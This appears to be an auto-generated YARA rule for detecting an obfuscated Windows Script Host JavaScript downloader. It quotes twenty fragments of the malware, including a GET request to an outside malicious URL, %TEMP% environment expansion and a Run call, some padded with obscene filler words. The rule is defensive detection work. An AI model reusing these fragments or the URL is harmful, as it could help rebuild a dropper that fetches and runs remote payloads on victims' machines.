rule sig_20160428_e7d8ab0480a0aa8a107c051a9ca3b994 {
  meta:
    description = "datamaliciousorder - file 20160428_e7d8ab0480a0aa8a107c051a9ca3b994.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8191f27a289eef2978f06788f1da6f1dc4691d658cc19765ce95cc337d397007"

  strings:
    $s1  = "RiaDfyMpbIgrTeaMkgJfb[HtvEyyVqzSjaYgaSejRse](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function UxqUkkNmlGuzXivBmtTuv() {return UnlRjtWnzOniSsaPyiXli[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function LqaPayCgoZrfZzfOriDib(GnaLxxNvvZvxEsbIdxTcj){UnlRjtWnzOniSsaPyiXli[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function LqaPayCgoZrfZzfOriDib(GnaLxxNvvZvxEsbIdxTcj){UnlRjtWnzOniSsaPyiXli[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var UnlRjtWnzOniSsaPyiXli = function MwzVhuLlcJylKopCwkKij() {return FofCkeUfmHbgFtmMfcQgp[EdyAhqXgxLbaEchQwwJku](\"WScript\"+\"" ascii
    $s6  = "var FofCkeUfmHbgFtmMfcQgp = this[\"WScript\"];" fullword ascii
    $s7  = "var UnlRjtWnzOniSsaPyiXli = function MwzVhuLlcJylKopCwkKij() {return FofCkeUfmHbgFtmMfcQgp[EdyAhqXgxLbaEchQwwJku](\"WScript\"+\"" ascii
    $s8  = "function UxqUkkNmlGuzXivBmtTuv() {return UnlRjtWnzOniSsaPyiXli[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function UhwIjzZvjZxhJdzUoaPpv(){return NlqInmApkRkoSnpUetXup + \"\";};" fullword ascii
    $s10 = "function BjfXcpWlxHlgNptOpaSwr(KxfNqbCbvHeqNwrJhfPuw, CcaRvqQnnVdgXyzQnrUep){ZobRorTudXrqFdsMyuNyg = ZobRorTudXrqFdsMyuNyg * 1; " ascii
    $s11 = "return KxfNqbCbvHeqNwrJhfPuw - CcaRvqQnnVdgXyzQnrUep;};" fullword ascii
    $s12 = "if (RiaDfyMpbIgrTeaMkgJfb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function DlmMsxUgvKvpTrhPaxFok() {return ((BebObhPgcKzyKvfHlbMnv == true) && (BebObhPgcKzyKvfHlbMnv == AniMrlEftUueZogMdrEib)) ?" ascii
    $s14 = "function DlmMsxUgvKvpTrhPaxFok() {return ((BebObhPgcKzyKvfHlbMnv == true) && (BebObhPgcKzyKvfHlbMnv == AniMrlEftUueZogMdrEib)) ?" ascii
    $s15 = "AniMrlEftUueZogMdrEib = true; " fullword ascii
    $s16 = "var IgkYzpRqwKgtWviJcnSwq = false;" fullword ascii
    $s17 = "IgkYzpRqwKgtWviJcnSwq = true;" fullword ascii
    $s18 = "var GzjCcuHupHttSggBuzMlb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "}while (IncUsqWwkTweXjkElkOga);" fullword ascii
    $s20 = "function XygWkbJitQedRaiKmoSia(TlmTvyGgdQzfBjyPieUkj) {var DnmJevTmmHpbKfsIdrOce = (1, 2, 3, 4, 5, TlmTvyGgdQzfBjyPieUkj); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}